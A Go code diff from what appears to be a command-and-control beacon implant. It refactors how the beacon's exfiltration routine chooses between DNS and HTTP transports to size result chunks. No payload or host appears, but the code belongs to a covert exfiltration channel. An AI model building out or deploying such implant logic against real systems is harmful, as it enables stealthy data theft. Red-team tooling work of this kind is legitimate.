@@ -479,12 +479,7 @@ func (b *Beacon) exfiltrateResult(result string, taskID string) error {
 	// and FQDN budgets; on HTTP it comes from the operator's configured payload
 	// and the listener's body limit. A dual beacon tries HTTP first, so it uses
 	// the HTTP budget unless it latched to DNS.
-	effective := "dns"
-	if b.transport != nil {
-		if m := b.transport.Mode(); m == transportHTTP || (m == transportDual && len(b.transport.transports) > 0) {
-			effective = "http"
-		}
-	}
+	effective := b.resultChunkTransport()
 
 	send := func(message string) (string, error) { return b.sendResultMessage(message, exfilPhase) }
 	chunkSize := b.client.config.ResultChunkSizeFor(effective)
@@ -509,6 +504,24 @@ func (b *Beacon) exfiltrateResult(result string, taskID string) error {
 	}
 
 	return err
+}
+
+// resultChunkTransport is the transport a result will actually use, which is
+// what its chunk size must match. An explicit ResultTransport wins; otherwise a
+// dual beacon uses HTTP only while the manager considers HTTP usable. During an
+// HTTP backoff (or after a DNS latch) sizing for HTTP would produce a frame the
+// DNS path cannot carry.
+func (b *Beacon) resultChunkTransport() string {
+	switch strings.ToLower(b.client.config.ResultTransport) {
+	case "dns":
+		return "dns"
+	case "http":
+		return "http"
+	}
+	if b.transport != nil && b.transport.ShouldUseHTTP() {
+		return "http"
+	}
+	return "dns"
 }
 
 // errResultMetaNotSent marks a result whose first frame was never accepted, so
